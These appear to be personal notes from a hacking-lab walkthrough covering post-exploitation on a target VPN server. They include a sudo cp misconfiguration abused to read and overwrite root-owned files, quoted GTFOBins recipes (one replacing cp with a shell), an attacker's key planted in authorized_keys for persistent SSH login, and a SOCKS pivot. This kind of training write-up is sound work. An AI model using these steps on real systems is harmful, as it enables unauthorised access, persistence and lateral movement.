## Getting SSH Keys

After getting a Reverse Shell you need to get SSH Keys to connect via SSH.

As you can use /bin/cp command as root from run the following command:
```
www-data@ip-10-200-113-12:/var/www/html$ **sudo /bin/cp /home/ubuntu/.ssh/authorized_keys /dev/stdout**

```

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCMLOT6NhiqH5Rp36qJt4jZwfvb/H/+YLRTrx5mS9dSyxumP8+chjxkSNOrdgNtZ6XoaDDDikslQvKMCqoJqHqp4jh9xTQTj29tagUaZmR0gUwatEJPG0SfqNvNExgsTtu2DW3SxCQYwrMtu9S4myr+4x+rwQ739SrPLMdBmughB13uC/3DCsE4aRvWL7p+McehGGkqvyAfhux/9SNgnIKayozWMPhADhpYlAomGnTtd8Cn+O1IlZmvqz5kJDYmnlKppKW2mgtAVeejNXGC7TQRkH6athI5Wzek9PXiFVu6IZsJePo+y8+n2zhOXM2mHx01QyvK2WZuQCvLpWKW92eF amiOpenVPN

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCeZbsrpsTaTF6VqP3nAl9icN4AGzsrhyxHHJq3nikhy7MV0effPfpWGgIuY2/8n3Ec7pcS8O3eWZLZInQQsyyby6ET072BkPu9Ku7alVTVwfNJytP49a/AajZ4PpvdT4smJkhxXgF7Y0Z9fd6DgYvkeE7e/xTdYysU4lmzGUbt5xPAKWlVh3kzt/8Ay+JaTnevxPiwEvWN2tushosde2XcyMfQAFYpFoOF5gL7QgkqoV4gm73SH93vvq0mNuqlGyGzXiWP5auwJK4qSnS1MXtx2WbTyE61zTnsxA9OQSHTtMNMiAQOAMTF/DQ38wPEy4SNaIecJCFPkqM50cTw++w7 TGreen-Key

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+IKDiXx+vyfU2QWArKGbJeT1Q/WvF7jX1slAmt/iZu89fUABt2O0wtqxs5e38zO4RvM8xqYwk3Pn0Sikqcaqlk2ra2A7xFdG92RNs4QYXJUyK6dW+G5RZGBQe+f0nIFx9Dz19WqlfbGWpenke5PYGLpNvZRilA9EvIvIJG6+lKf9CRgI0T5vkarqpuVSIqyS3wggOmj/vtzGM0bjERJJdsHaRtje4FJaRK3obIsOpfvSchq9QAmP72EYA4X4+eifThmlIF/o3b8uFwOTlhznjKtcEL5Dfrqc8X2Yv2p9R5kjI6/fpZbuXWVRWUHAu+Snu0RPqacJXGuAxUpb0COKf ubuntu@ip-172-31-10-250

## Create a new key on Kali
```
ssh-keygen -t rsa
```
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in rsa
Your public key has been saved in rsa.pub
The key fingerprint is:
SHA256:ODVcPKMY0xdD9uWpM9Veol6AHNY6YFg0+HAs1+yZ2t4 kali@kali
The key's randomart image is:
+---[RSA 3072]----+
|       B+=Oo  .  |
|      B.B*B=.o o |
|       @+=o*o = o|
|      .oo.*  = o.|
|      o So .= . .|
|       .. .. +   |
|         . ..    |
|          . E    |
|                 |
+----[SHA256]-----+

```
cat rsa.pub
```

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC20C4/W73M8kWWcghrF7puisfbN2/f8bwQ/FfKyKnCD6CphOfzNLPF+UX2xVBxTRD5zPBHFQ7reLojGLbSSxkBbWve7Jg3hcUiVefB08SRs11aHD8GR894j6WPzI0nuXsoVoeEfGYF70zbrsemmNHA6eFaAwJNsramm/BwIfcitLgKtey9ptd9Tu+eYAetN4Ii8VGWAvQ2EkbdZ9HQrZkCOPIA2pV8aIXRtGZWKPz7Nn3vi3bEjs0RgLUqRPtJ4ByVXXI/mc8SMQnRbc3ZPioHlLK7OmAc/OzNMyTN6Xf0/Wl2Gz7RrlrmszM5BYRo3rHutgLZUkYivoZ3Td1ug1Pmw2JyPL1TMFC6DVNTPK7+x45Yq0iW0n2/UXpKRmeWo83drhahhTfazid3PuLciwS+YZnxoE0g2cp4XxE+dzjcwias7oXoNSIPZ4Tim6q35fg4b5ItA5ZS/VlBjK0oCa3S9JQ7XqRFayz2rBIF1+1y+qR/ji+Mvi6v6Ln5vqUr+Q8= kali@kali



## cp command
https://gtfobins.github.io/gtfobins/cp/

### Sudo[](https://gtfobins.github.io/gtfobins/cp/#sudo)

^115a37

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

- ```
    LFILE=file_to_write
    echo "DATA" | sudo cp /dev/stdin "$LFILE"
    ```
    
- This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)
    
    ```
    LFILE=file_to_write
    TF=$(mktemp)
    echo "DATA" > $TF
    sudo cp $TF $LFILE
    ```
    
- This overrides `cp` itself with a shell (or any other executable) that is to be executed as root, useful in case a `sudo` rule allows to only run `cp` by path. Warning, this is a destructive action.
    
    ```
    sudo cp /bin/sh /bin/cp
    sudo cp
    ```


## Drop this key into the VPN's authorized_keys file
Following the instruccions from  File Write section run the commands on the reverse shell to drop the key into the VPN's authorized_keys file.

```
LFILE=/home/ubuntu/.ssh/authorized_keys

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC20C4/W73M8kWWcghrF7puisfbN2/f8bwQ/FfKyKnCD6CphOfzNLPF+UX2xVBxTRD5zPBHFQ7reLojGLbSSxkBbWve7Jg3hcUiVefB08SRs11aHD8GR894j6WPzI0nuXsoVoeEfGYF70zbrsemmNHA6eFaAwJNsramm/BwIfcitLgKtey9ptd9Tu+eYAetN4Ii8VGWAvQ2EkbdZ9HQrZkCOPIA2pV8aIXRtGZWKPz7Nn3vi3bEjs0RgLUqRPtJ4ByVXXI/mc8SMQnRbc3ZPioHlLK7OmAc/OzNMyTN6Xf0/Wl2Gz7RrlrmszM5BYRo3rHutgLZUkYivoZ3Td1ug1Pmw2JyPL1TMFC6DVNTPK7+x45Yq0iW0n2/UXpKRmeWo83drhahhTfazid3PuLciwS+YZnxoE0g2cp4XxE+dzjcwias7oXoNSIPZ4Tim6q35fg4b5ItA5ZS/VlBjK0oCa3S9JQ7XqRFayz2rBIF1+1y+qR/ji+Mvi6v6Ln5vqUr+Q8= kali@kali" | sudo cp /dev/stdin "$LFILE"
```
## Connect to the server from Kali
```
ssh ubuntu@10.200.10.12 -i rsa

```

The authenticity of host '10.200.10.12 (10.200.10.12)' can't be established.
ED25519 key fingerprint is SHA256:VNkFkNLPumSiOW8qgun9K81FptOl/QPenkQylHqjNPU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.200.10.12' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.4.0-1101-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Mar 10 10:42:32 UTC 2024

  System load:  0.0               Processes:           115
  Usage of /:   49.6% of 7.68GB   Users logged in:     0
  Memory usage: 19%               IP address for ens5: 10.200.10.12
  Swap usage:   0%                IP address for tun0: 12.100.1.1


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

72 packages can be updated.
1 update is a security update.


Last login: Thu May  4 17:53:22 2023 from 102.132.177.54
ubuntu@ip-10-200-10-12:~$



## Routing network traffic with proxychains
Kali Machine
```
ssh -D 9050 ubuntu@10.200.X.12 -i rsa
```